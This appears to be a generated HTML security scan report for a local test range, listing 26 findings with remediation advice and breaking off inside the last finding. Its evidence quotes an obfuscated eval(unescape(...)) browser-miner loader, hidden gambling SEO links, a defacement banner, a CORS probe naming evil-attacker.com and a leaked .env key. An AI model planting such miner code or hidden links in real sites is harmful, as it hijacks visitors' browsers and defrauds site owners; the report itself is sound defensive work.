@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>网站安全智能巡检与敏感信息防泄露评估报告 - 自动化靶场全流程测试</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 24px; }
+        .container { max-width: 1000px; margin: 0 auto; background: #1e293b; border-radius: 12px; padding: 32px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #334155; padding-bottom: 20px; margin-bottom: 24px; }
+        .header h1 { font-size: 22px; color: #38bdf8; margin: 0; }
+        .meta-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 24px; font-size: 13px; color: #94a3b8; background: #0f172a; padding: 16px; border-radius: 8px; }
+        .score-card { text-align: center; padding: 20px; background: #0f172a; border-radius: 10px; margin-bottom: 24px; border-left: 6px solid #ef4444; }
+        .score-num { font-size: 48px; font-weight: 800; color: #ef4444; }
+        .stats-row { display: flex; gap: 12px; margin-bottom: 30px; }
+        .stat-box { flex: 1; background: #0f172a; padding: 14px; border-radius: 8px; text-align: center; border: 1px solid #334155; }
+        .stat-val { font-size: 20px; font-weight: 700; margin-top: 4px; }
+        .finding-card { background: #0f172a; border: 1px solid #334155; border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
+        .finding-header { display: flex; align-items: center; gap: 10px; padding: 12px 16px; background: #1e293b; border-bottom: 1px solid #334155; }
+        .severity-badge { color: #fff; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 4px; }
+        .cvss-pill { margin-left: auto; font-size: 11px; background: #334155; padding: 2px 8px; border-radius: 12px; color: #cbd5e1; }
+        .finding-body { padding: 16px; font-size: 13px; line-height: 1.6; }
+        .evidence-box { background: #020617; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin: 10px 0; }
+        .evidence-box pre { margin: 6px 0 0 0; color: #38bdf8; font-family: monospace; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+        .remediation-box { background: #064e3b22; border-left: 4px solid #10b981; padding: 10px 14px; border-radius: 4px; margin-top: 10px; }
+        .footer { text-align: center; font-size: 12px; color: #64748b; margin-top: 40px; border-top: 1px solid #334155; padding-top: 16px; }
+        @media print {
+            body { background: #fff; color: #000; padding: 0; }
+            .container { box-shadow: none; border: none; background: #fff; color: #000; }
+            .meta-grid, .score-card, .stat-box, .finding-card { background: #f8fafc; border: 1px solid #cbd5e1; color: #000; }
+            .evidence-box { background: #f1f5f9; color: #000; }
+            .evidence-box pre { color: #0369a1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div>
+                <h1>🛡️ 网站安全智能巡检与敏感信息防泄露评估报告</h1>
+                <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">DAS-SentinelAgent (安恒星巡安全智能体) 自动生成</p>
+            </div>
+            <button onclick="window.print()" style="background:#0284c7; color:#fff; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; font-weight:600;">🖨️ 导出/打印 PDF</button>
+        </div>
+
+        <div class="meta-grid">
+            <div><strong>任务名称：</strong>自动化靶场全流程测试</div>
+            <div><strong>目标站点：</strong>http://127.0.0.1:8088</div>
+            <div><strong>巡检时间：</strong>2026-08-26T12:55:01.766612 ~ 2026-08-26T12:55:01.771373</div>
+            <div><strong>安全评级：</strong>DANGER (面临严重威胁)</div>
+        </div>
+
+        <div class="score-card">
+            <div style="font-size: 14px; color: #94a3b8; font-weight: 600;">综合安全态势评分</div>
+            <div class="score-num">0 <span style="font-size: 20px;">/ 100</span></div>
+            <div style="font-size: 13px; color: #cbd5e1; margin-top: 4px;">DANGER (面临严重威胁)</div>
+        </div>
+
+        <div class="stats-row">
+            <div class="stat-box" style="border-top: 3px solid #ef4444;">
+                <div style="color:#94a3b8; font-size:12px;">严重风险 (Critical)</div>
+                <div class="stat-val" style="color:#ef4444;">3</div>
+            </div>
+            <div class="stat-box" style="border-top: 3px solid #f97316;">
+                <div style="color:#94a3b8; font-size:12px;">高危风险 (High)</div>
+                <div class="stat-val" style="color:#f97316;">18</div>
+            </div>
+            <div class="stat-box" style="border-top: 3px solid #f59e0b;">
+                <div style="color:#94a3b8; font-size:12px;">中危风险 (Medium)</div>
+                <div class="stat-val" style="color:#f59e0b;">1</div>
+            </div>
+            <div class="stat-box" style="border-top: 3px solid #3b82f6;">
+                <div style="color:#94a3b8; font-size:12px;">低危与合规 (Low/Info)</div>
+                <div class="stat-val" style="color:#3b82f6;">4</div>
+            </div>
+        </div>
+
+        <h3 style="border-left: 4px solid #38bdf8; padding-left: 10px; margin-bottom: 16px;">📋 详细风险隐患与整改建议清单 (26 项)</h3>
+        
+        
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#1</span>
+                    <span class="severity-badge" style="background:#ef4444;">CRITICAL</span>
+                    <span class="finding-title">环境变量配置文件泄露 (.env)</span>
+                    <span class="cvss-pill">CVSS 9.8</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/.env</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>直接泄露数据库密码、应用秘钥和第三方 API Token</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>APP_NAME=GovDataPortal
+APP_ENV=production
+APP_KEY=base64:7vFwN4O2jXp9qZr8sL3mY0tW1kH6cE5a
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=gov_citizen_db
+DB_USERNAME=root
+DB_PASSWORD=Gov...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即限制 Web 服务器对 /.env 的直接访问，设置 403/404 拒绝规则或移除生产服务器上的敏感文件</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#2</span>
+                    <span class="severity-badge" style="background:#ef4444;">CRITICAL</span>
+                    <span class="finding-title">数据库备份文件明文暴露 (backup.sql)</span>
+                    <span class="cvss-pill">CVSS 9.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/backup.sql</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>整库业务数据面临被脱裤风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>-- 数据库导出备份
+CREATE TABLE IF NOT EXISTS `sys_users` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  `email` varchar(100) DEFAULT NULL,
+...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即限制 Web 服务器对 /backup.sql 的直接访问，设置 403/404 拒绝规则或移除生产服务器上的敏感文件</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#3</span>
+                    <span class="severity-badge" style="background:#ef4444;">CRITICAL</span>
+                    <span class="finding-title">页面被黑客篡改涂鸦 (Hacked by 标语)</span>
+                    <span class="cvss-pill">CVSS 9.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/tampered_section.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站主页或栏目已被恶意篡改，直接破坏政企形象并产生严重合规风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... 市民留言互动专栏
+
+Hacked by ShadowSec Team 2026
+Your portal securit ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即切断外网访问，使用代码版本控制及备份还原页面内容，同时进行全面后门排查</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#4</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">政企页面被植入博彩黑产违规内容</span>
+                    <span class="cvss-pill">CVSS 8.8</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站主页或栏目已被恶意篡改，直接破坏政企形象并产生严重合规风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... 检通知
+【动态】关于数字化示范标杆园区建设方案的通知
+
+
+
+澳门金沙真人在线博彩百家乐
+
+
+2026特码六合彩直营平台 ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即切断外网访问，使用代码版本控制及备份还原页面内容，同时进行全面后门排查</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#5</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">政企页面被植入博彩黑产违规内容</span>
+                    <span class="cvss-pill">CVSS 8.8</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站主页或栏目已被恶意篡改，直接破坏政企形象并产生严重合规风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... 检通知
+【动态】关于数字化示范标杆园区建设方案的通知
+
+
+
+澳门金沙真人在线博彩百家乐
+
+
+2026特码六合彩直营平台 ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即切断外网访问，使用代码版本控制及备份还原页面内容，同时进行全面后门排查</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#6</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">政企页面被植入博彩黑产违规内容</span>
+                    <span class="cvss-pill">CVSS 8.8</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/tampered_section.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站主页或栏目已被恶意篡改，直接破坏政企形象并产生严重合规风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... cords have been seized.
+欢迎访问在线澳门金沙真人博彩百家乐，特码六合彩大曝光！ ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即切断外网访问，使用代码版本控制及备份还原页面内容，同时进行全面后门排查</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#7</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">高度混淆的 eval(unescape(...)) 恶意挂马脚本</span>
+                    <span class="cvss-pill">CVSS 8.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/miner_test.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>访问用户的浏览器将被利用进行未授权挖矿、被植入远控木马或发生重定向欺诈</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>// 混淆执行恶意载荷
+        eval(unescape('%76%61%72%20%6D%69%6E%65%72%20%3D%20%6E%65%77%20%43%6F%69%6E%48%69%76%65%2E%41%6E%6F%6E%79%6D%6F%75%73%28%27%73%69%74%65%6B%65%79%27%29%3B%6D%69%6E%65%72%2E%73%74%61%72%74%28%29%3B'));</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>清除页面中的恶意 <script> 代码，配置严格的 CSP 策略 (script-src 'self')</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#8</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面存在涉黑产/博彩/违规恶意外链</span>
+                    <span class="cvss-pill">CVSS 8.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>可能导致政企网站权威性受损、被监管机构通报或被搜索引擎降权拦截</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre><a href="https://www.macau-casino-bet888.com">澳门金沙真人在线博彩百家乐</a></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>下线相关外链指向，检查是否有 CMS 模版注入漏洞或未授权编辑权限</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#9</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面存在涉黑产/博彩/违规恶意外链</span>
+                    <span class="cvss-pill">CVSS 8.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>可能导致政企网站权威性受损、被监管机构通报或被搜索引擎降权拦截</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre><a href="https://www.pk10-lottery-cp88.vip" style="position:absolute; left:-9999px; top:-9999px;">2026特码六合彩直营平台</a></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>下线相关外链指向，检查是否有 CMS 模版注入漏洞或未授权编辑权限</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#10</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面存在涉黑产/博彩/违规恶意外链</span>
+                    <span class="cvss-pill">CVSS 8.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>可能导致政企网站权威性受损、被监管机构通报或被搜索引擎降权拦截</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre><a href="https://www.macau-casino-bet888.com">澳门金沙真人在线博彩百家乐</a></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>下线相关外链指向，检查是否有 CMS 模版注入漏洞或未授权编辑权限</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#11</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面存在涉黑产/博彩/违规恶意外链</span>
+                    <span class="cvss-pill">CVSS 8.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>可能导致政企网站权威性受损、被监管机构通报或被搜索引擎降权拦截</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre><a href="https://www.pk10-lottery-cp88.vip" style="position:absolute; left:-9999px; top:-9999px;">2026特码六合彩直营平台</a></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>下线相关外链指向，检查是否有 CMS 模版注入漏洞或未授权编辑权限</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#12</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">网页被植入 Web 挖矿脚本 (Coinhive/CryptoLoot)</span>
+                    <span class="cvss-pill">CVSS 8.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/miner_test.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>访问用户的浏览器将被利用进行未授权挖矿、被植入远控木马或发生重定向欺诈</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>ample-malicious.com/coinhive.min.js</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>清除页面中的恶意 <script> 代码，配置严格的 CSP 策略 (script-src 'self')</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#13</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面暴露敏感信息: 中华人民共和国居民身份证</span>
+                    <span class="cvss-pill">CVSS 7.8</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/news/notice_2026.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>违反《数据安全法》与《个人信息保护法》，造成【中华人民共和国居民身份证】直接泄露风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>>张*伟</td>
+                <td>110101********2340</td>
+                <td>1381</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即对页面或 API 返回中的敏感数据进行脱敏处理，移除未经授权公开的敏感字段</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#14</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面暴露敏感信息: 银行卡/信用卡号</span>
+                    <span class="cvss-pill">CVSS 7.8</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/news/notice_2026.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>违反《数据安全法》与《个人信息保护法》，造成【银行卡/信用卡号】直接泄露风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>>张*伟</td>
+                <td>1101********2340</td>
+                <td>1381</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即对页面或 API 返回中的敏感数据进行脱敏处理，移除未经授权公开的敏感字段</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#15</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">CORS 跨域资源共享高危错误配置 (任意 Origin 反射且携带凭据)</span>
+                    <span class="cvss-pill">CVSS 7.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>第三方恶意网站可跨域发起请求并读取受害用户的敏感会话及业务数据</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>Origin: https://evil-attacker.com -> Access-Control-Allow-Origin: https://evil-attacker.com, Access-Control-Allow-Credentials: true</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>对 Access-Control-Allow-Origin 实施严格的白名单校验，禁止动态反射不受信任的 Origin，或在需要通配符时禁用 Allow-Credentials</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#16</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">Git 版本控制元数据泄露 (.git/HEAD)</span>
+                    <span class="cvss-pill">CVSS 7.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/.git/HEAD</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>攻击者可下载完整网站源代码与配置文件</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>ref: refs/heads/main</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即限制 Web 服务器对 /.git/HEAD 的直接访问，设置 403/404 拒绝规则或移除生产服务器上的敏感文件</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#17</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面检测到隐蔽暗链 (利用负坐标偏离屏幕可视区域隐藏)</span>
+                    <span class="cvss-pill">CVSS 7.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站常被黑客利用暗链进行黑帽 SEO 引流或私自挂载恶意站点</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre><a href="https://www.pk10-lottery-cp88.vip" style="position:absolute; left:-9999px; top:-9999px;">2026特码六合彩直营平台</a></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即清理页面中被非法植入的隐藏 <a> 标签代码，并排查网站发布系统及数据库权限</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#18</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">页面检测到隐蔽暗链 (利用负坐标偏离屏幕可视区域隐藏)</span>
+                    <span class="cvss-pill">CVSS 7.5</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站常被黑客利用暗链进行黑帽 SEO 引流或私自挂载恶意站点</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre><a href="https://www.pk10-lottery-cp88.vip" style="position:absolute; left:-9999px; top:-9999px;">2026特码六合彩直营平台</a></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即清理页面中被非法植入的隐藏 <a> 标签代码，并排查网站发布系统及数据库权限</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#19</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">命中自定义敏感关键词: 【扶持补贴资金】</span>
+                    <span class="cvss-pill">CVSS 7.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>检测到包含本单位重要敏感标识或保密关键词【扶持补贴资金】的内容被公开发布</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... 息防护要求。
+
+最新通知公告
+
+【公示】2026年度数字民生扶持补贴资金发放名单汇总表
+【公告】政务云平台运维升级与网络安全巡检通知 ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>核查该页面发布审批流程，删除或替换敏感业务关键词</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#20</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">命中自定义敏感关键词: 【扶持补贴资金】</span>
+                    <span class="cvss-pill">CVSS 7.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>检测到包含本单位重要敏感标识或保密关键词【扶持补贴资金】的内容被公开发布</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... 息防护要求。
+
+最新通知公告
+
+【公示】2026年度数字民生扶持补贴资金发放名单汇总表
+【公告】政务云平台运维升级与网络安全巡检通知 ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>核查该页面发布审批流程，删除或替换敏感业务关键词</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#21</span>
+                    <span class="severity-badge" style="background:#f97316;">HIGH</span>
+                    <span class="finding-title">命中自定义敏感关键词: 【扶持补贴资金】</span>
+                    <span class="cvss-pill">CVSS 7.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/news/notice_2026.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>检测到包含本单位重要敏感标识或保密关键词【扶持补贴资金】的内容被公开发布</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>... 2026年度数字民生扶持补贴资金发放名单公示
+
+
+
+2026年度数字民生扶持补贴资金发放名单 ...</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>核查该页面发布审批流程，删除或替换敏感业务关键词</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#22</span>
+                    <span class="severity-badge" style="background:#f59e0b;">MEDIUM</span>
+                    <span class="finding-title">页面暴露敏感信息: 中国大陆手机号码</span>
+                    <span class="cvss-pill">CVSS 5.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/news/notice_2026.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>违反《数据安全法》与《个人信息保护法》，造成【中国大陆手机号码】直接泄露风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>2340</td>
+                <td>138****5678</td>
+                <td>6222</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即对页面或 API 返回中的敏感数据进行脱敏处理，移除未经授权公开的敏感字段</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#23</span>
+                    <span class="severity-badge" style="background:#3b82f6;">LOW</span>
+                    <span class="finding-title">页面暴露敏感信息: 电子邮箱地址</span>
+                    <span class="cvss-pill">CVSS 5.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088/about.html</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>违反《数据安全法》与《个人信息保护法》，造成【电子邮箱地址】直接泄露风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>发利用与安全合规保障工作。</p>
+    <p>联系邮箱：go****cn</p>
+</body>
+</html></pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>立即对页面或 API 返回中的敏感数据进行脱敏处理，移除未经授权公开的敏感字段</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#24</span>
+                    <span class="severity-badge" style="background:#3b82f6;">LOW</span>
+                    <span class="finding-title">缺失 X-Frame-Options 响应头（点击劫持风险）</span>
+                    <span class="cvss-pill">CVSS 4.3</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>网站可被第三方恶意站点通过 iframe 嵌入，诱导用户点击产生点击劫持攻击</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>Missing header: X-Frame-Options / frame-ancestors in CSP</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>在 Web 服务器配置中增加: X-Frame-Options: SAMEORIGIN</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#25</span>
+                    <span class="severity-badge" style="background:#64748b;">INFO</span>
+                    <span class="finding-title">缺失 X-Content-Type-Options 响应头</span>
+                    <span class="cvss-pill">CVSS 2.6</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>浏览器可能会将非可执行文件当作脚本执行，增加 MIME 混淆 XSS 风险</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
+                        <pre>Missing header: X-Content-Type-Options: nosniff</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>在响应头中添加: X-Content-Type-Options: nosniff</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="finding-card">
+                <div class="finding-header">
+                    <span class="finding-num">#26</span>
+                    <span class="severity-badge" style="background:#64748b;">INFO</span>
+                    <span class="finding-title">Web 容器详细版本信息暴露 (uvicorn)</span>
+                    <span class="cvss-pill">CVSS 2.0</span>
+                </div>
+                <div class="finding-body">
+                    <p><strong>📍 风险目标：</strong><code>http://127.0.0.1:8088</code></p>
+                    <p><strong>⚠️ 危害影响：</strong>便于攻击者快速识别后端中间件具体版本并匹配已知 CVE 漏洞库</p>
+                    <div class="evidence-box">
+                        <strong>🔍 现场证据链：</strong>
